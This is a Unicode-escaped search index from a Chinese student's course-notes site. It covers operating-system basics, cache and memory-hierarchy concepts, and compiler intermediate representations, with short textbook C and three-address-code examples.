<p>\u4e0d\u540c\u7684\u8fdb\u7a0b\u95f4\u8981\u5171\u4eab\u6570\u636e\uff0c\u5982\u679c\u662f\u7ebf\u7a0b\u95f4\u5171\u4eab\uff0c\u90a3\u6570\u636e\u4f1a\u5f88\u5e9e\u5927\uff1b</p> <p>\u5f15\u5165\u7ebf\u7a0b\uff0c\u7ebf\u7a0b\u53ef\u4ee5\u88ab\u8c03\u5ea6\uff0c\u53ea\u9700\u8981load/store\u518d\u5b9e\u73b0\u540c\u6b65\u5c31\u53ef\u4ee5\u5b9e\u73b0\u5171\u4eab\u3002</p> <ul> <li>\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u7684\u591a\u4e2a\u7ebf\u7a0b\u5171\u4eab\u4e86memory\u3001global data\u3001heap\uff1b\u4e0d\u5171\u4eabstack</li> <li>\u6bcf\u4e2a\u7ebf\u7a0b\u6709\u81ea\u5df1\u7684\u6808\u548cPC</li> <li>\u7ebf\u7a0b\u548c\u7ebf\u7a0b\u7684\u6808\u4e0d\u662f\u9694\u79bb\u7684\uff0c\u662f\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u5230</li> </ul>"}, {"location": "Course/System2/Lec01_Introduction/#resource-management-memory-management", "title": "Resource Management: Memory Management | \u5185\u5b58\u7ba1\u7406", "text": "<ul> <li> <p>Memory is the main storage directly accessible to CPU </p> </li> <li> <p>data needs to be kept in memory before and after processing</p> </li> <li> <p>all instructions should be in memory in order to execute</p> </li> <li> <p>Memory management determines what is in memory to optimize CPU utilization and response time, provides a virtual view of memory for programmer</p> </li> <li> <p>Memory management activities:</p> </li> <li> <p>keeping track of which parts of memory are being used and by whom</p> </li> <li> <p>deciding which processes and data to move into and out of memory</p> </li> <li> <p>allocating and deallocating memory space as needed</p> </li> </ul> <p>\u7ba1\u7406CPU\uff0c\u7ba1\u7406Memory\uff0c\u505a\u597d\u540c\u6b65\u5360\u53bb\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u7684\u5927\u90e8\u5206\u5de5\u4f5c</p>"}, {"location": "Course/System2/Lec01_Introduction/#resource-management-file-systems", "title": "Resource Management: File Systems | \u6587\u4ef6\u7cfb\u7edf", "text": "<ul> <li> <p>\u4ecb\u7ecd\u8f83\u5c11,\u7cfb\u7edf\u2162</p> </li> <li> <p>\u5c06\u5e73\u65f6\u6240\u4f7f\u7528\u7684\u53ef\u89c6\u5316\u7684\u6587\u4ef6\u8def\u5f84\u6620\u5c04\u5230\u7269\u7406\u5b58\u50a8\u4ecb\u8d28\u4e0a</p> </li> </ul> <ul> <li> <p>OS provides a uniform, logical view of data storage</p> </li> <li> <p>file is a logical storage unit that abstracts physical properties</p> <ul> <li> <p>files are usually organized into directories(\u76ee\u5f55)</p> </li> <li> <p>access control determines who can access the file</p> </li> </ul> </li> <li> <p>File system management activities:</p> </li> <li> <p>creating and deleting files and directories</p> </li> <li> <p>primitives to manipulate files and directories</p> </li> <li> <p>mapping files onto secondary storage</p> </li> <li> <p>backup files onto stable (non-volatile) storage media</p> </li> </ul>"}, {"location": "Course/System2/Lec01_Introduction/#resource-management-io-system-management", "title": "Resource Management: I/O System Management", "text": "<p>\u5e2e\u52a9\u7528\u6237\u6001\u7a0b\u5e8f\u548c\u5916\u8bbe\u6253\u4ea4\u9053</p> <ul> <li> <p>I/O subsystem hides peculiarities of hardware devices from the user</p> </li> <li> <p>I/O subsystem is responsible for:</p> </li> <li> <p>manage I/O memory</p> <ul> <li> <p>buffering: to store data temporarily while it is being transferred</p> </li> <li> <p>caching: to store parts of data in faster storage for performance</p> </li> <li> <p>spooling: the overlapping of output of one job with input of other jobs</p> </li> </ul> </li> <li> <p>OS May provide general device-driver interfaces(\u6bcf\u4e00\u7c7b\u8bbe\u5907\u90fd\u6709\u5bf9\u5e94\u7684\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f)</p> </li> <li> <p>good for programmers: object-oriented design pattern</p> </li> <li> <p>bad from the security perspective: function pointers are heavily used</p> </li> </ul> <p></p>"}, {"location": "Course/System2/Lec01_Introduction/#separate-policy-and-mechanism", "title": "Separate Policy and Mechanism", "text": "<ul> <li>Mechanism(\u673a\u5236): how question about a system | \u600e\u4e48\u5b9e\u73b0</li> <li>How does an operating system performs a context switch</li> </ul> <p>\u4e0d\u540c\u7684\u8c03\u5ea6\u5668\u5b9e\u73b0\u4e0d\u540c\u7684Policy</p> <ul> <li>Policy(\u7b56\u7565): which question </li> <li> <p>Which process should the process to be switched</p> </li> <li> <p>Any other examples about mechanism &amp; policy?</p> </li> <li> <p>Advantages &amp; Disadvantages</p> </li> <li>Advantages of separation:<ul> <li>\u589e\u52a0\u6574\u4e2a\u7684\u7075\u6d3b\u6027.</li> </ul> </li> </ul>"}, {"location": "Course/System2/Lec01_Introduction/#virtualization", "title": "Virtualization", "text": "<ul> <li>Abstract the hardware of a single computer (CPU/Memory/IO \u2026) into different environments</li> </ul>"}, {"location": "Course/System2/Lec01_Introduction/#three-piecesintroduction", "title": "Three pieces\u4e2d\u7684Introduction", "text": ""}, {"location": "Course/System2/Lec01_Introduction/#what-happens-when-a-program-runs", "title": "What happens when a program runs?", "text": "<ul> <li>Execute instructions (obviously)</li> <li> <p>fetch, decode, and execute</p> </li> <li> <p>Others things are happening in the backend</p> </li> <li> <p>make the program to run</p> </li> <li> <p>allow many programs to use/share memory</p> </li> <li> <p>allow may programs to interact with devices</p> </li> </ul>"}, {"location": "Course/System2/Lec01_Introduction/#all-about-virtualization", "title": "All about Virtualization", "text": "<ul> <li> <p>Virtualization</p> </li> <li> <p>OS transforms the physical resources into easy-to-use virtual form</p> </li> <li> <p>Interaction: system calls - interfaces between program and OS</p> </li> <li> <p>Managing: resources manager</p> </li> </ul>"}, {"location": "Course/System2/Lec01_Introduction/#virtualizing-the-cpu", "title": "Virtualizing The CPU", "text": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/time.h&gt;\n#include &lt;assert.h&gt;\n#include \"common.h\"\nint main(int argc, char *argv[])\n{\n    if(argc != 2)\n    {\n        fprintf(stderr, \"usage: cpu &lt;string&gt;\\n\");\n        exit(1);\n    }\n    char *str = argv[1];\n    while(1)\n    {\n        Spin(1);\n        printf(\"%s\\n\", str);\n    }\n    return 0;\n}\n</code></pre>"}, {"location": "Course/System2/Lec01_Introduction/#virtualizing-memory", "title": "Virtualizing Memory", "text": "<pre><code>#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include \"common.h\"\n\nint main(int argc, char *argv[])\n{\n    int *p = malloc(sizeof(int));\n    assert(p != NULL);\n    printf(\"(%d) memory address of p: %08x\\n\", getpid(), (unsigned) p);\n    /* getpid\u7cfb\u7edf\u8c03\u7528,\u6253\u5370\u5f53\u524d\u8fd0\u884c\u7a0b\u5e8f\u5bf9\u5e94\u7684\u8fdb\u7a0b\u53f7 */\n    *p = 0;\n    while(1)\n    {\n        Spin(1);\n        *p = *p + 1;\n        printf(\"(%d) p: %d\\n\", getpid(), *p);\n    }\n    return 0;\n}\n</code></pre>"}, {"location": "Course/System2/Lec01_Introduction/#concurrency", "title": "Concurrency | \u5e76\u53d1", "text": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include\"common.h\"\nvolatile int counter = 0;\nint loops;\n\nvoid *worker(void *arg) \n{\n    int i;\n    for(i = 0; i &lt; loops; i++) \n    {\n        counter++;\n    }\n    return NULL;\n}\nint main(int argc, char *argv[])\n{\n    if(argc != 2)\n    {\n        fprintf(stderr, \"usage: threads &lt;value&gt;\\n\");\n        exit(1);\n    }\n    loops = atoi(argv[1]);\n    pthread_t p1, p2;\n    printf(\"Initial value : %d\\n\", counter);\n\n    Pthread_create(&amp;p1, NULL, worker, NULL);\n    Pthread_create(&amp;p2, NULL, worker, NULL);\n    Pthread_join(p1, NULL);\n    Pthread_join(p2, NULL);\n    printf(\"Final value : %d\\n\", counter);\n\n    return 0;\n}\n</code></pre>"}, {"location": "Course/System2/Lec01_Introduction/#io", "title": "I/O", "text": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;assert.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;sys/types.h&gt;\n\nint main(int argc, char *argv[])\n{\n    int fd = open(\"/tmp/file\", O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU);\n    assert(fd &gt; -1);\n    intrc = write(fd, \"hello world\\n\", 13);\n    assert(rc == 13);\n    close(fd);\n    return 0;\n}\n</code></pre>"}, {"location": "Course/System3/", "title": "\u8ba1\u7b97\u673a\u7cfb\u7edf\u2162", "text": "<p> \u7ea6 93 \u4e2a\u5b57 </p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf\u2162 \u662f ZJU \u8ba1\u7b97\u673a\u7cfb\u7edf\u7cfb\u5217\u8bfe\u7a0b\u4e4b\u4e00\uff0c\u5305\u62ec\u64cd\u4f5c\u7cfb\u7edf\u540e\u534a\u90e8\u5206\u548c\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u5185\u5bb9</p> \u671f\u672b\u8865\u5929 <ul> <li> \u4f53\u7cfb\u7ed3\u6784\u590d\u4e60\u8bfe.pdf</li> <li> \u4f53\u7cfb\u7ed3\u6784\u7b14\u8bb0.pdf</li> <li> OS \u590d\u4e60\u8bfe.pdf</li> </ul> <p>\u53ea\u505a\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\uff0c\u7981\u6b62\u88ab\u7528\u4e8e\u5546\u4e1a\u5316\u7528\u9014</p>"}, {"location": "Course/System3/Lec04/", "title": "Lec04", "text": "<p> \u7ea6 670 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p>"}, {"location": "Course/System3/Lec04/#three-classes-of-computers-with-different-concerns-in-memory-hierarchy", "title": "Three classes of computers with different concerns in memory hierarchy", "text": "<ul> <li>Desktop computers:<ul> <li>Are primarily running one application for single user</li> <li>Are concerned more with average latency from the memory hierarchy</li> </ul> </li> <li>Server computers<ul> <li>May typically have hundreds of users running potentially dozens of applications simultaneously</li> <li>Are concerned about memory bandwith</li> </ul> </li> <li>Embedded computers<ul> <li>Real-time applications<ul> <li>worst-case performance vs Best case performance</li> </ul> </li> <li>Are concerned more about power and battery life<ul> <li>Hardware vs Software</li> </ul> </li> <li>Running single app &amp; use simple OS<ul> <li>The protection role of the memory hierarchy is often diminished</li> </ul> </li> <li>Main memory is very small<ul> <li>often no disk storage</li> </ul> </li> </ul> </li> </ul>"}, {"location": "Course/System3/Lec04/#enhance-speed-of-memory", "title": "Enhance speed of memory", "text": "<ul> <li>Component character of hardware:<ul> <li>Smaller hardware is faster and more expensive</li> <li>Bigger memories are lower and cheaper</li> </ul> </li> </ul> <p>The goal: * There are speed of smallest memory and capacity of biggest memory * To provide cost almost as low as the cheapest level of memory and speed almost as fast as the fastest level</p>"}, {"location": "Course/System3/Lec04/#the-method-enhance-speed-of-memory", "title": "The method enhance speed of memory", "text": "<ul> <li>By taking advantage of the principle of locality:<ul> <li>most programs do not access all code or data uniformly</li> <li>Temporal locality(Locality in Time):<ul> <li>If an item is referenced, the same item will tend to be referenced again soon</li> <li>Keep most recently accessed data items closer to the processor</li> </ul> </li> <li>Spatial locality(Locality in Space):<ul> <li>If an item is referenced, items nearby will tend to be referenced soon</li> <li>Move recently accessed groups of contiguous words(block) closer to the processor</li> </ul> </li> </ul> </li> </ul> <p>\u540e\u7eed\u7684\u6240\u6709\u4f18\u5316\u90fd\u57fa\u4e8e Locality in Time &amp; Locality in Space</p> <ul> <li>The method<ul> <li>Hierarchies bases on memories of different speeds and size</li> <li>The more closely CPU the level is, the faster the one is</li> <li>The more closely CPU the level is, the smaller the one is</li> <li>The more closely CPU the level is, the more expensive one is</li> </ul> </li> </ul>"}, {"location": "Course/System3/Lec04/#memory-hierarchy-of-a-modern-computer-system", "title": "Memory Hierarchy of a Modern Computer System", "text": "<p>By taking advantage of the principle of locality: * Present the user with as much memory as is available in the cheapest technology * Provide access at the speed offered by the fastest technology  </p>"}, {"location": "Course/System3/Lec04/#36-terms-of-cache", "title": "36 terms of Cache", "text": "36 terms of Cache Cache full associative write allocate Virtual memory dirty bit unified cache Memory stall cycles block block offset misses per instruction direct mapped write back Valid bit data cache locality Block address hit time address trace Write through cache miss set Instruction cache page fault miss rate random replacement index field cache hit Average memory access time page tag field n-way set associative no-write allocate miss penalty Least-recently used write buffer write stall"}, {"location": "Course/System3/Lec04/#what-is-cache", "title": "What is Cache", "text": "<ul> <li>Small, fast storage used to improve average access time to slow memory</li> <li>In computer architecture, almost everything is a cache<ul> <li>Registers \u201ca cache\u201d on variables \u2013software managed</li> <li>First-level cache a cache on second-level cache</li> <li>Second-level cache a cache on memory</li> <li>Memory a cache on disk (virtual memory)</li> <li>TLB a cache on page table</li> <li>Branch-prediction a cache on prediction information ?</li> </ul> </li> </ul> Question <p>How do know if a data is in cache? Moreover, if it is, how do we find it?</p>"}, {"location": "Course/System3/Lec04/#four-questions-for-cache-designers", "title": "Four Questions for Cache Designers", "text": "<ul> <li>Caching is a general concept used in processors, operating systems, file systems, and applications. There are Four Questions for Cache/Memory Hierarchy Designers<ul> <li>Q1 (Block placement):  Where can a block be placed in the upper level/mainmemory ? <ul> <li>Fully Associative, Set Associative, Direct Mapped</li> </ul> </li> <li>Q2 (Block identification): How is a block found if it is in the upper level/main memory ?<ul> <li>Tag/Block</li> </ul> </li> <li>Q3 (Block replacement): Which block should be replaced on a Cache/main memory miss?<ul> <li>Random, LRU, FIFO</li> </ul> </li> <li>Q4 (Write strategy): What happens on a write?<ul> <li>Write Back or Write Through (with Write Buffer)</li> </ul> </li> </ul> </li> </ul>"}, {"location": "Course/System3/Lec04/#q1-block-placement", "title": "Q1: Block placement", "text": "<ul> <li>Direct Mapped<ul> <li>Block can only go in one place in the cache (Usually address MOD Number of blocks in chche)</li> </ul> </li> <li>Fully Associative<ul> <li>Block can go anywhere in the cache</li> </ul> </li> <li>Set Associative<ul> <li>Block can go in one of a set of places in the cache</li> <li>A set is a group of blocks in the cache (Block address MOD Number of sets in the cache)</li> <li>If sets have n blocks, then the cache is n-way set associative</li> </ul> </li> </ul>"}, {"location": "Course/cp/", "title": "Compile Principle | \u7f16\u8bd1\u539f\u7406", "text": "<p> \u7ea6 249 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>Abstract</p> <ul> <li>\u672c\u8bfe\u4e3b\u8981\u56f4\u7ed5 Modern Compiler Implementation in C , Andrew W. Appel\uff08\u4fd7\u79f0\u201c\u864e\u4e66\u201d\uff09</li> <li>\u8bfe\u7a0b\u5185\u5bb9\u5bf9\u5e94\u201c\u864e\u4e66\u201d\u4e2d\u7684 1-11\uff0c13\uff0c14\uff0c18\u7ae0</li> <li>\u8bfe\u7a0b\u4e3b\u9875\uff1a<ul> <li>https://rainoftime.github.io/teaching/</li> <li>https://accsys.pages.zjusct.io/accipit/</li> </ul> </li> </ul> \u8003\u6838\u65b9\u5f0f <ul> <li>\u8bfe\u7a0b\u4f5c\u4e1a(\u8bfe\u540e\u5c0f\u578b\u7ec3\u4e60\u9898) = 10%</li> <li>\u968f\u5802\u6d4b\u9a8c = 10%</li> <li>\u671f\u4e2d\u8003\u8bd5 = 15%</li> <li>\u7efc\u5408\u6027\u8bfe\u7a0b\u8bbe\u8ba1 = 25%</li> <li>\u671f\u672b\u8003\u8bd5 = 40% </li> </ul> <p>list</p> <ul> <li> Introduction | \u8bfe\u7a0b\u4ecb\u7ecd</li> <li> Lexical Analysis | \u8bcd\u6cd5\u5206\u6790</li> <li> Parsing 1 | \u8bed\u6cd5\u5206\u6790 (Top-Down Parsing)</li> <li> Parsing 2 | \u8bed\u6cd5\u5206\u6790 (Bottom-Up Parsing)</li> <li> Semantic Analysis | \u8bed\u4e49\u5206\u6790\uff0cActivation Record | \u6d3b\u52a8\u8bb0\u5f55</li> <li> Translating into Intermediate Code | \u4e2d\u95f4\u4ee3\u7801\u751f\u6210</li> <li> Basic Blocks and Traces | \u57fa\u672c\u5757\u4e0e\u8f68\u8ff9</li> <li> Instruction Selection | \u6307\u4ee4\u9009\u62e9</li> <li> Liveness Analysis | \u6d3b\u8dc3\u53d8\u91cf\u5206\u6790</li> <li> Register Allocation | \u5bc4\u5b58\u5668\u5206\u914d</li> <li> Garbage Collection | \u5783\u573e\u56de\u6536</li> <li> Object-Oriented Languages | \u9762\u5411\u5bf9\u8c61\u8bed\u8a00</li> <li> Loop Optimization | \u5faa\u73af\u4f18\u5316</li> </ul> More Reference <ul> <li>Stanford cs143</li> <li>MIT</li> <li>UC Berkeley</li> <li>Compiler \u2013 Principles, Techniques and Tools (2<sup>nd</sup> ed.) , Aho, Sethi and Ullman\uff08\u4fd7\u79f0\u201c\u9f99\u4e66\u201d\uff09</li> <li>Engineering a Compiler (2<sup>nd</sup>/3<sup>rd</sup> ed.) , Cooper, Keith D., Torczon, Linda\uff08\u4fd7\u79f0\u201c\u6a61\u4e66\u201d\uff09</li> <li>Advanced Compiler Design and Implementation , Steven S.Muchnick\uff08\u4fd7\u79f0\u201c\u9cb8\u4e66\u201d\uff09</li> <li>Parsing Techniques: A Practical Guide \uff0c Grune, Jacobs</li> </ul>"}, {"location": "Course/cp/GarbageCollection/", "title": "Garbage Collection", "text": "<p> \u7ea6 2 \u4e2a\u5b57 </p>"}, {"location": "Course/cp/LivenessAnalysis/", "title": "Liveness Analysis", "text": "<p> \u7ea6 2 \u4e2a\u5b57 </p>"}, {"location": "Course/cp/LoopOptimization/", "title": "Loop Optimization", "text": "<p> \u7ea6 2 \u4e2a\u5b57 </p>"}, {"location": "Course/cp/OOLang/", "title": "Object-Oriented Languages", "text": "<p> \u7ea6 2 \u4e2a\u5b57 </p>"}, {"location": "Course/cp/RegAlloc/", "title": "Register Allocation", "text": "<p> \u7ea6 2 \u4e2a\u5b57 </p>"}, {"location": "Course/cp/basicBlock/", "title": "Basic Blocks and Traces", "text": "<p> \u7ea6 4 \u4e2a\u5b57 </p>"}, {"location": "Course/cp/instructionSel/", "title": "Instruction Selection", "text": "<p> \u7ea6 2 \u4e2a\u5b57 </p>"}, {"location": "Course/cp/intermediateCode/", "title": "Translating into Intermediate Code", "text": "<p> \u7ea6 3086 \u4e2a\u5b57  108 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p>"}, {"location": "Course/cp/intermediateCode/#_1", "title": "\u4e2d\u95f4\u8868\u793a\u6982\u8ff0", "text": "<p>Abstract</p> <ul> <li>\u4e2d\u95f4\u8868\u793a\uff08IR\uff09<ul> <li>\u4e00\u79cd\u62bd\u8c61\u7684\u673a\u5668\u8bed\u8a00</li> <li>\u80fd\u591f\u8868\u8fbe\u76ee\u6807\u673a\u5668\u7684\u64cd\u4f5c</li> <li>\u4e0d\u8fc7\u591a\u6d89\u53ca\u673a\u5668\u7279\u5b9a\u7684\u7ec6\u8282</li> </ul> </li> <li>\u8bbe\u8ba1\u76ee\u6807<ul> <li>\u53ef\u79fb\u690d\u7684\u7f16\u8bd1\u5668\uff0c\u9002\u7528\u4e8e\u4e0d\u540c\u7684\u6e90\u8bed\u8a00\u548c\u4e0d\u540c\u7684\u76ee\u6807\u673a\u5668</li> </ul> </li> <li>IR \u5e94\u8be5\u7b80\u6d01<ul> <li>\u8bed\u6cd5\u6811\u7684\u5927\u5757\u90e8\u5206\u5fc5\u987b\u8f6c\u6362\u4e3a IR</li> <li>IR \u7684\u7ec4\u5408\u5fc5\u987b\u805a\u5408\u6210\u201c\u771f\u5b9e\u201d\u7684\u673a\u5668\u6307\u4ee4</li> </ul> </li> </ul> <p>\u4e3a\u4ec0\u4e48\u9700\u8981\u4e2d\u95f4\u8868\u793a (IR): \u5982\u679c\u76f4\u63a5\u7ffb\u8bd1\u6210\u673a\u5668\u4ee3\u7801\uff0c\u4f1a\u59a8\u788d\u6a21\u5757\u5316 (modularity) \u548c\u53ef\u79fb\u690d\u6027 (portability)\u3002</p>"}, {"location": "Course/cp/intermediateCode/#ir", "title": "(\u4e0d\u8981\u6c42\u638c\u63e1) IR\u5206\u7c7b", "text": "<p>1) \u6839\u636e\u62bd\u8c61\u5c42\u6b21\uff1a</p> <p>TODO</p> <p>2) \u6839\u636e\u7ed3\u6784\u7279\u5f81\uff1a</p> <p>TODO</p>"}, {"location": "Course/cp/intermediateCode/#three-address-code", "title": "\u4e09\u5730\u5740\u7801 | Three-Address Code", "text": "<p>Abstract</p> <ul> <li>\u76ee\u6807\uff1a<ul> <li>\u63a5\u8fd1\u5927\u591a\u6570\u76ee\u6807\u673a\u5668\u7684\u6267\u884c\u6a21\u578b (\u673a\u5668\u7801)</li> <li>\u652f\u6301\u5927\u591a\u6570\u76ee\u6807\u673a\u5668\u63d0\u4f9b\u7684\u6570\u636e\u7c7b\u578b\u548c\u64cd\u4f5c</li> <li>\u63d0\u4f9b\u6709\u9650\u5ea6\u7684\u3001\u9ad8\u4e8e\u673a\u5668\u7801\u7684\u62bd\u8c61\u8868\u8fbe\u80fd\u529b\uff0c\u66f4\u5bb9\u6613\u8868\u8fbe\u51fa\u5927\u591a\u6570(\u547d\u4ee4\u5f0f) \u9ad8\u7ea7\u8bed\u8a00\u7684\u7279\u6027</li> </ul> </li> <li>\u7279\u5f81\uff1a<ul> <li>\u4ee5\u6307\u4ee4\u4e3a\u5355\u4f4d</li> <li>\u6bcf\u6761\u6307\u4ee4\u53ea\u6709\u6709\u9650\u6570\u91cf\u7684\u64cd\u4f5c\u7801</li> </ul> </li> </ul> <p>\u4e09\u5730\u5740\u7801\u7684\u4e00\u822c\u5f62\u5f0f\uff1a\\(x = y ~ op ~ z\\)</p> <ul> <li>\u6bcf\u4e2a\u201c\u6307\u4ee4\u201d\u6700\u591a 1 \u4e2a\u8fd0\u7b97\u7b26\uff0c\u6700\u591a 3 \u4e2a\u64cd\u4f5c\u6570</li> <li>E.g., <code>x + y * z</code> \u7ffb\u8bd1\u4e3a\u4e09\u5730\u5740\u8bed\u53e5\u5e8f\u5217\uff1a<code>t1 = y * z</code>, <code>t2 = x + t1</code></li> </ul> Note \u5e8f\u53f7 \u6307\u4ee4\u7c7b\u578b \u6307\u4ee4\u5f62\u5f0f 1 \u8d4b\u503c\u6307\u4ee4 <code>x = y op z</code>; <code>x = op y</code> 2 \u590d\u5236\u8df3\u8f6c <code>x = y</code> 3 \u6761\u4ef6\u8df3\u8f6c \uff5c <code>if x  relop y goto n</code> 4 \u65e0\u6761\u4ef6\u8df3\u8f6c <code>goto n</code> 5 \u53c2\u6570\u4f20\u9012 <code>param x</code> 6 \u8fc7\u7a0b\u8c03\u7528 <code>call p, n</code> 7 \u8fc7\u7a0b\u8fd4\u56de <code>return x</code> \u2026 \u2026 \u2026 <p>\u201c\u5730\u5740\u201d\u53ef\u4ee5\u5177\u6709\u5982\u4e0b\u5f62\u5f0f\u4e4b\u4e00\uff1a</p> <ul> <li>\u6e90\u7a0b\u5e8f\u4e2d\u7684 \u540d\u5b57 (name)</li> <li>\u5e38\u91cf (constant)</li> <li>\u7f16\u8bd1\u5668\u751f\u6210\u7684 \u4e34\u65f6\u53d8\u91cf (temporary)</li> </ul> Example <p>High-Level Language</p> <pre><code>read x ;  { input an integer }\nif 0 &lt; x then { don\u2019t compute if x &lt;= 0 } \n    fact:=1;\nrepeat \n    fact:=fact*x;\n    x:=x-1\nuntil x=0;\nwrite fact { output factorial of x }\nend\n</code></pre> <p>Three-Address Code</p> <pre><code>read x \nt1=x&gt;0 \nif_false t1 goto L1 \nfact=1 \nlabel   L2 \nt2 = fact * x \nfact = t2 \nt3 = x - 1 \nx = t3 \nt4= x= =0 \nif_false t4 goto L2 \nwrite fact \nlabel   L1 \nhalt\n</code></pre> <ul> <li>\u6574\u4e2a\u4e09\u5730\u5740\u6307\u4ee4\u5e8f\u5217\u5b9e\u73b0\u4e3a\u94fe\u8868\u6570\u7ec4\u7684\u5f62\u5f0f\uff1a</li> <li>\u6700\u5e38\u89c1\u7684\u5b9e\u73b0\u65b9\u5f0f\u662f\u5c06\u4e09\u5730\u5740\u4ee3\u7801\u8868\u793a\u4e3a\u56db\u5143\u7ec4 (quadruples)\uff1a<ul> <li>\u4e00\u4e2a\u5b57\u6bb5\u7528\u4e8e\u64cd\u4f5c</li> <li>\u4e09\u4e2a\u5b57\u6bb5\u7528\u4e8e\u5730\u5740 \u5bf9\u4e8e\u90a3\u4e9b\u9700\u8981\u5c11\u4e8e\u4e09\u4e2a\u5730\u5740\u7684\u6307\u4ee4\uff0c\u5176\u4e2d\u4e00\u4e2a\u6216\u591a\u4e2a\u5730\u5740\u5b57\u6bb5\u4f1a\u88ab\u8d4b null \u6216 \u201cempty\u201d \u503c</li> </ul> </li> </ul> example code <pre><code>t1 = x &gt; 0           -&gt; (gt, x, 0, t1)\nif_false t1 goto L1  -&gt; (if_false, t1, L1, _)\nfact = 1             -&gt; (assign, 1, fact, _)\nlabel L2             -&gt; (label, L2, _, _)\n</code></pre> <p>\u5176\u4ed6\u5b9e\u73b0\u65b9\u5f0f\u5305\u62ec\uff1a\u4e09\u5143\u7ec4\uff0c\u95f4\u63a5\u4e09\u5143\u7ec4\u3002</p>"}, {"location": "Course/cp/intermediateCode/#ssa", "title": "\u9759\u6001\u5355\u8d4b\u503c (SSA)\uff08\u4e0d\u8003\uff09", "text": "<p>TODO</p>"}, {"location": "Course/cp/intermediateCode/#ir-tree", "title": "IR Tree \u4e2d\u95f4\u8868\u793a", "text": "<p>Tiger \u4ec5\u4ec5\u4f7f\u7528\u4e00\u4e2a IR \u2014\u2014 the Intermediate Representation (IR) Tree\u3002</p> <pre><code>AST =&gt; IR Tree =&gt; assembly =&gt; machine code\n</code></pre> <p>A Low Level Tree Representation</p> <p></p> <p>1) IR Tree: Expressions:</p> <p>\u8868\u8fbe\u5f0f\u4ee3\u8868\u5bf9\u67d0\u4e2a\u503c\u7684\u8ba1\u7b97\uff0c\u53ef\u80fd\u8fd8\u6709\u526f\u4f5c\u7528</p> Expression Meaning <code>CONST(i)</code> \u5e38\u91cf <code>i</code> <code>NAME(n)</code> \u7b26\u53f7\u5e38\u6570 n\uff08\u4f8b\u5982\u6807\u7b7e\uff0c<code>goto .L</code> \u4e2d <code>.L</code> \u5c31\u662f NAME\uff09 <code>TEMP(t)</code> \u4e34\u65f6\u53d8\u91cf <code>t</code> (\u865a\u62df\u5bc4\u5b58\u5668\u3001\u4e0d\u8003\u8651\u5bc4\u5b58\u5668\u4e2a\u6570) <code>BINOP(op, e1, e2)</code> \u4e8c\u5143\u64cd\u4f5c\u7b26 <code>op</code> <code>MEM(e)</code> \u4ee5\u5730\u5740 <code>e</code> \u5f00\u59cb\u7684 <code>wordSize</code> \u5b57\u8282\u5185\u5b58\u7684\u5185\u5bb9\u3002\u5f53 <code>MEM</code> \u4f5c\u4e3a <code>MOVE</code> \u64cd\u4f5c\u7684\u5de6\u5b50\u8282\u70b9\u65f6\uff0c\u5b83\u7684\u610f\u601d\u662f\u201d\u5b58\u50a8\u201d\uff0c\u4f46\u5728\u5176\u4ed6\u4efb\u4f55\u5730\u65b9\uff0c\u5b83\u7684\u610f\u601d\u662f\u201d\u8bfb\u53d6\u201d\u3002 <code>CALL(f, args)</code> \u8fc7\u7a0b\u8c03\u7528\uff1a\u5c06\u51fd\u6570 <code>f</code> \u5e94\u7528\u4e8e\u53c2\u6570\u5217\u8868 <code>l</code> <code>ESEQ(s, e)</code> \u5148\u8ba1\u7b97 <code>stm s</code>,\u518d\u6839\u636e <code>stm s</code> \u8ba1\u7b97 <code>exp e</code>, \u5f97\u51fa\u7ed3\u679c <p>\u5176\u4e2d\uff0c<code>MEM</code> \u8868\u8fbe\u5f0f\uff0c\u5982 x86 \u4e2d\u7684 <code>[rax] = 100</code>, <code>rbx = [rax]</code></p> \u5173\u4e8e ESEQ <p><code>ESEQ(s, e)</code>: The statement s is evaluated for side effects, then e is evaluated for a result.</p> <ul> <li>\u5047\u8bbe <code>s</code> \u662f <code>statement a=5</code>, <code>e</code> \u662f <code>expression a+5</code></li> <li><code>Statement</code> (\u5982 <code>a=5</code> ) \u4e0d\u8fd4\u56de\u503c,\u4f46\u662f\u6709\u526f\u4f5c\u7528</li> <li><code>ESEQ(a=5, a + 5)</code> \u6700\u7ec8\u7684\u7ed3\u679c\u662f10</li> </ul> <p>\u5173\u4e8e Side Effects: \u526f\u4f5c\u7528\u6307\u66f4\u65b0\u5185\u5b58\u5355\u5143\u6216\u4e34\u65f6\u5bc4\u5b58\u5668\u7684\u5185\u5bb9</p> <p>2) IR Tree: The Statements:</p> <p>Statements performs side-effects and control flow - no return value!</p> Statements Meaning <code>MOVE(TEMP t, e)</code> \u8ba1\u7b97 <code>e</code> \u5e76\u5c06\u5176\u79fb\u52a8\u5230\u4e34\u65f6\u53d8\u91cf <code>t</code> \u4e2d <code>MOVE(MEM(e1), e2)</code> \u8ba1\u7b97 <code>e1</code> \u5f97\u5230\u5730\u5740 <code>a</code> \uff0c\u518d\u8ba1\u7b97 <code>e2</code> \u653e\u5165\u5730\u5740 <code>a</code> \u4e2d <code>EXP(e)</code> \u8ba1\u7b97\u8868\u8fbe\u5f0f <code>e</code>\uff0c\u5e76\u5ffd\u7565\u7ed3\u679c <code>JUMP(e, labs)</code> \u5c06\u63a7\u5236\u6743\uff08\u8df3\u8f6c\uff09\u8f6c\u79fb\u5230\u5730\u5740 <code>e</code>\u3002\u76ee\u6807 <code>e</code> 